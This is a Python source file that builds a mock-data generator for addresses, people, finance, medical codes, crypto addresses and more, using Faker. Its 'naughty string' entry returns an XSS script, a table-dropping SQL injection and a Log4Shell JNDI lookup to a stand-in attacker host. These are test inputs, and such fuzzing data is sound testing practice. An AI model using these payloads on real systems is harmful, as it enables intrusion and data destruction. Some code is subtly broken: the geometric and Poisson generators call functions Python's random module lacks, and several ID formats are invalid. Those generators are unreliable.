"""
Comprehensive Data Types Generator
Supports all data types from the reference documentation
"""

import random
import uuid
import hashlib
import base64
from faker import Faker
from datetime import datetime, timedelta
import json
import re
import string
from decimal import Decimal
import ipaddress

fake = Faker()

# Enhanced data generators for all supported types
DATA_TYPE_GENERATORS = {
    # Location & Address
    "address line 2": lambda: random.choice(["Apt 4B", "Suite 200", "Floor 5", "PO Box 1234", "Unit 7", "Room 303"]),
    "airport code": lambda: random.choice(["LAX", "JFK", "SFO", "ORD", "DFW", "ATL", "LHR", "CDG", "NRT", "SYD"]),
    "airport continent": lambda: random.choice(["NA", "AF", "EU", "AS", "SA", "OC", "AN"]),
    "airport country code": lambda: random.choice(["US", "CA", "DE", "FR", "JP", "AU", "UK", "BR", "IN", "CN"]),
    "airport elevation": lambda: random.randint(0, 10000),
    "airport gps code": lambda: f"{random.choice(['W', 'K', 'N', 'Y'])}{fake.random_letter().upper()}{fake.random_letter().upper()}{fake.random_letter().upper()}",
    "airport latitude": lambda: round(random.uniform(-90, 90), 6),
    "airport longitude": lambda: round(random.uniform(-180, 180), 6),
    "airport municipality": lambda: fake.city(),
    "airport name": lambda: f"{fake.city()} {random.choice(['International', 'Regional', 'County', 'Municipal'])} Airport",
    "airport region code": lambda: f"{random.choice(['US', 'CA', 'AU', 'MY'])}-{fake.state_abbr()}",
    "city": lambda: fake.city(),
    "country": lambda: fake.country(),
    "country code": lambda: fake.country_code(),
    "latitude": lambda: round(random.uniform(-90, 90), 6),
    "longitude": lambda: round(random.uniform(-180, 180), 6),
    "postal code": lambda: fake.postcode(),
    "state": lambda: fake.state(),
    "state (abbrev)": lambda: fake.state_abbr(),
    "street address": lambda: fake.street_address(),
    "street name": lambda: fake.street_name(),
    "street number": lambda: fake.random_int(min=1, max=99999),
    "street suffix": lambda: random.choice(["Drive", "Street", "Avenue", "Boulevard", "Lane", "Road", "Terrace"]),
    "time zone": lambda: random.choice(["America/Los_Angeles", "America/New_York", "Europe/London", "Asia/Tokyo", "Australia/Sydney"]),

    # Person & Demographics
    "animal common name": lambda: random.choice(["Wombat, common", "Owl, snowy", "Jungle kangaroo", "Red fox", "Gray wolf", "Bald eagle"]),
    "animal scientific name": lambda: random.choice(["Vombatus ursinus", "Nyctea scandiaca", "Macropus agilis", "Vulpes vulpes", "Canis lupus", "Haliaeetus leucocephalus"]),
    "family name (chinese)": lambda: random.choice(["赵", "钱", "孙", "李", "周", "吴", "郑", "王"]),
    "first name": lambda: fake.first_name(),
    "first name (european)": lambda: random.choice(["Görel", "Marie-josée", "Hélène", "Jürgen", "François", "Søren"]),
    "first name (female)": lambda: fake.first_name_female(),
    "first name (male)": lambda: fake.first_name_male(),
    "full name": lambda: fake.name(),
    "gender": lambda: random.choice(["Female", "Male", "Non-binary"]),
    "gender (abbrev)": lambda: random.choice(["M", "F", "NB"]),
    "gender (binary)": lambda: random.choice(["Female", "Male"]),
    "gender (facebook)": lambda: random.choice(["Female", "Male", "Non-binary", "Custom", "Prefer not to say"]),
    "given name (chinese)": lambda: random.choice(["崇杉", "永鑫", "鑫蕾", "伟强", "秀英", "建华"]),
    "job title": lambda: fake.job(),
    "race": lambda: random.choice(["Filipino", "Venezuelan", "Asian", "Caucasian", "African American", "Hispanic"]),
    "title": lambda: random.choice(["Mr", "Ms", "Dr", "Prof", "Eng", "Hon"]),
    "username": lambda: fake.user_name(),

    # Business & Finance
    "bank city": lambda: random.choice(["SAN FRANCISCO", "PHILADELPHIA", "CHICAGO", "NEW YORK", "BOSTON"]),
    "bank country code": lambda: random.choice(["US", "CA", "UK", "DE", "FR", "JP"]),
    "bank lei": lambda: f"{fake.random_int(min=1000000000000000, max=9999999999999999)}",
    "bank name": lambda: random.choice(["BANK OF AMERICA", "WELLS FARGO", "JPMORGAN CHASE", "CITIBANK", "GOLDMAN SACHS"]),
    "bank riad code": lambda: f"RI{fake.random_int(min=100000, max=999999)}",
    "bank routing number": lambda: f"{random.randint(10000000, 99999999)}",
    "bank state": lambda: fake.state_abbr(),
    "bank street address": lambda: random.choice(["195 MARKET STREET", "601 PENN STREET", "8001 VILLA PARK DRIVE"]),
    "bank swift bic": lambda: fake.swift(),
    "company name": lambda: fake.company(),
    "credit card #": lambda: fake.credit_card_number(),
    "credit card type": lambda: random.choice(["visa", "mastercard", "americanexpress", "discover"]),
    "currency": lambda: random.choice(["Dollar", "Euro", "Peso", "Yen", "Pound", "Rupee"]),
    "currency code": lambda: fake.currency_code(),
    "department (corporate)": lambda: random.choice(["Human Resources", "Accounting", "Engineering", "Marketing", "Finance"]),
    "department (retail)": lambda: random.choice(["Grocery", "Books", "Health & Beauty", "Electronics", "Clothing"]),
    "duns number": lambda: f"{random.randint(100000000, 999999999)}",
    "ein": lambda: f"{random.randint(10, 99)}-{random.randint(1000000, 9999999)}",
    "fake company name": lambda: f"{fake.last_name()} {random.choice(['Group', 'Inc', 'LLC', 'Corporation', 'Solutions'])}",
    "money": lambda: f"${random.uniform(1, 10000):.2f}",
    "stock industry": lambda: random.choice(["Semiconductors", "Major Banks", "Oil & Gas Production", "Technology", "Healthcare"]),
    "stock market": lambda: random.choice(["NYSE", "NASDAQ", "LSE", "TSE", "FSE"]),
    "stock market cap": lambda: f"${random.uniform(1000000, 100000000000):.0f}B",
    "stock name": lambda: f"{fake.company()} Corporation",
    "stock sector": lambda: random.choice(["Technology", "Capital Goods", "Finance", "Healthcare", "Energy"]),
    "stock symbol": lambda: fake.ticker(),

    # Technology & Digital
    "app bundle id": lambda: f"com.{fake.word()}.{fake.word()}",
    "app name": lambda: f"{fake.word().title()} {random.choice(['Pro', 'Plus', 'Lite', 'Max', 'Hub'])}",
    "app version": lambda: f"{random.randint(1,5)}.{random.randint(0,99)}",
    "avatar": lambda: f"https://robohash.org/{uuid.uuid4()}?set=set4&size=200x200",
    "bitcoin address": lambda: fake.sha256()[:40],
    "domain name": lambda: fake.domain_name(),
    "ethereum address": lambda: f"0x{fake.sha256()[:40]}",
    "ip address v4": lambda: fake.ipv4(),
    "ip address v4 cidr": lambda: f"{fake.ipv4()}/{random.randint(8, 32)}",
    "ip address v6": lambda: fake.ipv6(),
    "ip address v6 cidr": lambda: f"{fake.ipv6()}/{random.randint(8, 128)}",
    "mac address": lambda: fake.mac_address(),
    "md5": lambda: fake.md5(),
    "mime type": lambda: random.choice(["text/plain", "image/png", "application/pdf", "video/mp4", "audio/mp3"]),
    "mobile device brand": lambda: random.choice(["Sony", "Samsung", "Apple", "Google", "OnePlus"]),
    "mobile device model": lambda: random.choice(["Xperia Z3", "Galaxy S5", "iPhone 6", "Pixel 7", "OnePlus 9"]),
    "mobile device os": lambda: random.choice(["Android", "iOS"]),
    "mobile device release date": lambda: str(random.randint(2014, 2024)),
    "sha1": lambda: fake.sha1(),
    "sha256": lambda: fake.sha256(),
    "tezos account": lambda: f"tz{fake.sha256()[:33]}",
    "tezos block": lambda: f"BK{fake.sha256()[:51]}",
    "tezos contract": lambda: f"KT{fake.sha256()[:36]}",
    "tezos operation": lambda: f"op{fake.sha256()[:50]}",
    "tezos signature": lambda: f"sig{fake.sha256()[:96]}",
    "url": lambda: fake.url(),
    "user agent": lambda: fake.user_agent(),

    # Automotive
    "car make": lambda: random.choice(["Honda", "Ford", "Pontiac", "Toyota", "BMW", "Mercedes", "Tesla"]),
    "car model": lambda: random.choice(["Prelude", "Mustang", "Trans Am", "Camry", "3 Series", "C-Class", "Model 3"]),
    "car model year": lambda: str(random.randint(1994, 2024)),
    "car vin": lambda: f"{fake.random_uppercase_letter()}{fake.random_uppercase_letter()}{random.randint(100000, 999999)}{fake.random_uppercase_letter()}{random.randint(100000, 999999)}",

    # Healthcare & Medical
    "drug company": lambda: random.choice(["Eli Lilly and Company", "Novartis Pharmaceuticals Corporation", "Teva Pharmaceuticals USA Inc"]),
    "drug name (brand)": lambda: random.choice(["Cialis", "Nexium", "Lipitor", "Viagra", "Advil"]),
    "drug name (generic)": lambda: random.choice(["Naproxen Sodium", "Selenium Sulfide", "Acetaminophen", "Ibuprofen"]),
    "fda ndc code": lambda: f"{random.randint(10000, 99999)}-{random.randint(100, 999)}-{random.randint(10, 99)}",
    "hospital city": lambda: fake.city(),
    "hospital name": lambda: f"{fake.city()} {random.choice(['Medical Center', 'Hospital', 'General Hospital'])}",
    "hospital npi": lambda: f"{random.randint(1000000000, 9999999999)}",
    "hospital postal code": lambda: fake.postcode(),
    "hospital state": lambda: fake.state_abbr(),
    "hospital street address": lambda: fake.street_address(),
    "icd10 diagnosis code": lambda: f"{random.choice(['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(10, 99)}.{random.randint(0, 9)}",
    "icd10 dx desc (long)": lambda: random.choice(["Type 2 diabetes mellitus", "Hypertension", "Acute myocardial infarction", "Chronic obstructive pulmonary disease"]),
    "icd10 dx desc (short)": lambda: random.choice(["Type 2 diabetes", "Hypertension", "Heart attack", "COPD"]),
    "icd10 proc desc (long)": lambda: random.choice(["Coronary angioplasty", "Appendectomy", "Cholecystectomy", "Hip replacement"]),
    "icd10 proc desc (short)": lambda: random.choice(["Angioplasty", "Appendectomy", "Gallbladder removal", "Hip replacement"]),
    "icd10 procedure code": lambda: f"{random.randint(10000, 99999)}",
    "icd9 diagnosis code": lambda: f"{random.randint(100, 999)}.{random.randint(0, 9)}",
    "icd9 dx desc (long)": lambda: random.choice(["Diabetes mellitus", "Essential hypertension", "Acute myocardial infarction", "COPD"]),
    "icd9 dx desc (short)": lambda: random.choice(["Diabetes", "Hypertension", "Heart attack", "COPD"]),
    "icd9 proc desc (long)": lambda: random.choice(["Percutaneous transluminal coronary angioplasty", "Appendectomy", "Laparoscopic cholecystectomy"]),
    "icd9 proc desc (short)": lambda: random.choice(["PTCA", "Appendectomy", "Laparoscopic cholecystectomy"]),
    "icd9 procedure code": lambda: f"{random.randint(1, 99)}.{random.randint(10, 99)}",
    "medicare beneficiary id": lambda: f"{random.randint(1, 9)}{fake.random_uppercase_letter()}{random.randint(1000000, 9999999)}{random.choice(['A', 'C', 'D', 'M', 'P', 'T', 'W'])}",
    "nhs number": lambda: f"{random.randint(100000000, 999999999)}",

    # Construction
    "construction heavy equipment": lambda: random.choice(["Compactor", "Grader", "Trencher", "Excavator", "Bulldozer", "Crane"]),
    "construction material": lambda: random.choice(["Glass", "Plastic", "Aluminum", "Steel", "Concrete", "Wood"]),
    "construction role": lambda: random.choice(["Construction Manager", "Supervisor", "Foreman", "Site Engineer"]),
    "construction standard cost code": lambda: random.choice(["11-200 - Water Supply", "1-518 - Temporary Water", "1-542 - Construction Scaffolding"]),
    "construction subcontract category": lambda: random.choice(["Masonry", "Roofing (Asphalt)", "EIFS", "Electrical", "Plumbing"]),
    "construction trade": lambda: random.choice(["Stucco Mason", "Welder", "Ironworker", "Electrician", "Plumber"]),

    # Entertainment & Media
    "movie genres": lambda: random.choice(["Action | Suspense", "Thriller", "Comedy", "Drama", "Horror", "Sci-Fi"]),
    "movie title": lambda: random.choice(["Goodfellas", "Titanic", "Silverado", "The Godfather", "Star Wars", "Avatar"]),

    # Products & Retail
    "product category": lambda: random.choice(["Toys", "Clothing - Outerwear", "Outdoor", "Electronics", "Home & Garden"]),
    "product description": lambda: f"Savory {random.choice(['chips', 'crackers', 'snacks'])} with {random.choice(['BBQ', 'cheese', 'spicy'])} flavor",
    "product (grocery)": lambda: random.choice(["Tomato - Green", "Spinach - Baby", "Avocado", "Apple - Red", "Banana"]),
    "product name": lambda: random.choice(["Classic Black Trousers", "Lemon Dill Salmon", "Travel Makeup Organizer"]),
    "product price": lambda: round(random.uniform(9.99, 999.99), 2),
    "product subcategory": lambda: random.choice(["Plant-Based Beverages", "Gourmet Snacks", "Home Fragrance & Accessories"]),
    "shirt size": lambda: random.choice(["S", "M", "L", "XL", "XXL"]),

    # Identification Numbers
    "guid": lambda: str(uuid.uuid4()),
    "isbn": lambda: f"{random.randint(100000000, 999999999)}-{random.choice(['X', str(random.randint(0, 9))])}",
    "mongodb objectid": lambda: f"{random.randint(1000000000000000000000000, 9999999999999999999999999)}",
    "ssn": lambda: f"{random.randint(100, 999)}-{random.randint(10, 99)}-{random.randint(1000, 9999)}",
    "ulid": lambda: f"{random.randint(1000000000000000, 9999999999999999)}{random.choice(['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'J', 'K', 'M', 'N', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'X', 'Y', 'Z'])}{random.randint(1000000000000000, 9999999999999999)}",

    # Aviation
    "flight airline code": lambda: random.choice(["AA", "DL", "UA", "SW", "BA", "LH", "AF", "EK"]),
    "flight airline name": lambda: random.choice(["American Airlines", "Delta Air Lines", "United Airlines", "Southwest Airlines"]),
    "flight arrival airport": lambda: f"{fake.city()} {random.choice(['International', 'Regional'])} Airport",
    "flight arrival airport code": lambda: random.choice(["SFO", "DFW", "LHR", "JFK", "LAX", "ORD", "ATL"]),
    "flight arrival city": lambda: random.choice(["Chicago", "San Francisco", "Dallas", "New York", "Los Angeles"]),
    "flight arrival country": lambda: random.choice(["United States", "France", "Japan", "Canada", "United Kingdom"]),
    "flight departure airport": lambda: f"{fake.city()} {random.choice(['International', 'Regional'])} Airport",
    "flight departure airport code": lambda: random.choice(["JFK", "LAX", "ORD", "ATL", "SFO", "DFW"]),
    "flight departure city": lambda: random.choice(["New York", "Los Angeles", "Chicago", "Atlanta", "Miami"]),
    "flight departure country": lambda: random.choice(["United States", "Canada", "United Kingdom", "Germany", "Japan"]),
    "flight departure time": lambda: f"{random.randint(1, 12):02d}:{random.randint(0, 59):02d} {random.choice(['AM', 'PM'])}",
    "flight duration (hours)": lambda: round(random.uniform(0.5, 15.0), 2),
    "flight number": lambda: f"{random.choice(['AA', 'DL', 'UA'])}{random.randint(100, 9999)}",

    # Education
    "university": lambda: random.choice(["The Johns Hopkins University", "Pepperdine University", "University of Texas", "MIT", "Stanford"]),

    # Professional Skills
    "linkedin skill": lambda: random.choice(["Algorithms", "Sports Nutrition", "Payroll", "Project Management", "Data Analysis"]),

    # Nature & Biology
    "plant common name": lambda: random.choice(["Abietinella Moss", "Silver Fir", "Sedge", "Oak Tree", "Pine Tree"]),
    "plant family": lambda: random.choice(["Thuidiaceae", "Pinaceae", "Cyperaceae", "Fagaceae", "Pinaceae"]),
    "plant scientific name": lambda: random.choice(["Abietinella abietina", "Abies alba", "Abildgaardia Vahl", "Quercus robur", "Pinus sylvestris"]),

    # Data & Programming
    "base64 image url": lambda: f"data:image/png;base64,{base64.b64encode(b'fake_image_data').decode()}",
    "blank": lambda: None,
    "boolean": lambda: random.choice([True, False]),
    "character sequence": lambda: ''.join(random.choices(string.ascii_letters + string.digits + "!@#$%^&*", k=10)),
    "color": lambda: random.choice(["Red", "Blue", "Black", "Green", "Yellow", "Purple"]),
    "custom list": lambda: "Custom list data - implement specific logic",
    "dataset column": lambda: "Dataset column data - implement specific logic",
    "digit sequence": lambda: ''.join(random.choices(string.digits, k=10)),
    "dummy image url": lambda: f"http://dummyimage.com/{random.randint(100, 500)}x{random.randint(100, 500)}",
    "encrypt": lambda: f"encrypted_{fake.sha256()[:16]}",
    "file name": lambda: f"{'.'.join(fake.words(nb=3)).lower()}.{random.choice(['pptx', 'csv', 'docx', 'pdf', 'txt'])}",
    "formula": lambda: "Formula data - implement specific logic",
    "json array": lambda: json.dumps([{"id": i, "value": fake.word()} for i in range(random.randint(1, 5))]),
    "number": lambda: round(random.uniform(0.01, 9999.99), 2),
    "regular expression": lambda: "Regex data - implement specific pattern",
    "repeating element": lambda: "Repeating element - implement XML logic",
    "row number": lambda: 1,  # Will be set by row generation logic
    "scenario": lambda: random.randint(1, 100),
    "sequence": lambda: random.randint(1, 1000),
    "sql expression": lambda: "SQL expression - implement specific logic",
    "template": lambda: "Template data - implement concatenation logic",
    "top level domain": lambda: random.choice(["com", "edu", "org", "gov", "net", "io"]),

    # Text & Content
    "buzzword": lambda: random.choice(["contextually-based", "radical", "proactive", "synergistic", "paradigm-shifting"]),
    "catch phrase": lambda: f"{random.choice(['Synergize', 'Leverage', 'Optimize', 'Innovate'])} {random.choice(['solutions', 'platforms', 'frameworks', 'ecosystems'])}",
    "email address": lambda: fake.email(),
    "frequency": lambda: random.choice(["Never", "Once", "Seldom", "Often", "Daily", "Weekly", "Monthly", "Yearly"]),
    "hcpcs code": lambda: f"{random.choice(['A', 'B', 'C', 'D', 'E', 'G', 'H', 'J', 'K', 'L', 'M', 'P', 'Q', 'R', 'S', 'T', 'V'])}{random.randint(1000, 9999)}",
    "hcpcs name": lambda: random.choice(["Office visit", "Hospital visit", "Specialist visit", "Emergency visit"]),
    "hex color": lambda: f"#{random.randint(0, 0xFFFFFF):06X}",
    "language": lambda: random.choice(["German", "English", "Spanish", "French", "Chinese", "Japanese"]),
    "language code": lambda: random.choice(["de", "en", "es", "fr", "zh", "ja"]),
    "nato phonetic": lambda: random.choice(["Whiskey", "Alpha", "Bravo", "Charlie", "Delta", "Echo"]),
    "naughty string": lambda: random.choice(["<script>alert('xss')</script>", "'; DROP TABLE users; --", "${jndi:ldap://evil.com/a}"]),
    "paragraphs": lambda: fake.paragraph(nb_sentences=3),
    "password": lambda: fake.password(length=12, special_chars=True, digits=True, upper_case=True, lower_case=True),
    "password hash": lambda: fake.sha256(),
    "sentences": lambda: fake.sentence(nb_words=10),
    "short hex color": lambda: f"#{random.randint(0, 0xFFF):03X}",
    "slogan": lambda: f"{random.choice(['Innovating', 'Leading', 'Transforming'])} the {random.choice(['future', 'world', 'industry'])}",
    "words": lambda: fake.words(nb=5),

    # Statistical Distributions
    "binomial distribution": lambda: sum([1 for _ in range(10) if random.random() < 0.5]),
    "exponential distribution": lambda: round(random.expovariate(1.0), 3),
    "geometric distribution": lambda: random.geometric(p=0.3),
    "normal distribution": lambda: round(random.gauss(50, 15), 2),
    "poisson distribution": lambda: random.poisson(lam=5),

    # Dates & Times
    "datetime": lambda: fake.date_time().strftime("%m/%d/%Y"),
    "time": lambda: fake.time(pattern="%I:%M %p"),
}

def generate_data_value(data_type: str, custom_params: dict = None):
    """
    Generate data for a specific data type
    
    Args:
        data_type: The data type to generate
        custom_params: Optional parameters for custom data types
    
    Returns:
        Generated data value
    """
    data_type_lower = data_type.lower().strip()
    
    # Direct match
    if data_type_lower in DATA_TYPE_GENERATORS:
        return DATA_TYPE_GENERATORS[data_type_lower]()
    
    # Fuzzy matching for common variations
    for key, generator in DATA_TYPE_GENERATORS.items():
        if data_type_lower in key or key in data_type_lower:
            return generator()
    
    # Fallback to faker
    return fake.word()

def get_supported_data_types():
    """Return list of all supported data types"""
    return list(DATA_TYPE_GENERATORS.keys())

def get_data_types_by_category():
    """Return data types organized by category"""
    categories = {
        "Location & Address": [],
        "Person & Demographics": [],
        "Business & Finance": [],
        "Technology & Digital": [],
        "Automotive": [],
        "Healthcare & Medical": [],
        "Construction": [],
        "Entertainment & Media": [],
        "Products & Retail": [],
        "Identification Numbers": [],
        "Aviation": [],
        "Education": [],
        "Nature & Biology": [],
        "Data & Programming": [],
        "Text & Content": [],
        "Statistical Distributions": [],
        "Dates & Times": []
    }
    
    # This would need to be implemented based on the keys above
    # For now, return all types in a single category
    categories["All"] = list(DATA_TYPE_GENERATORS.keys())
    
    return categories
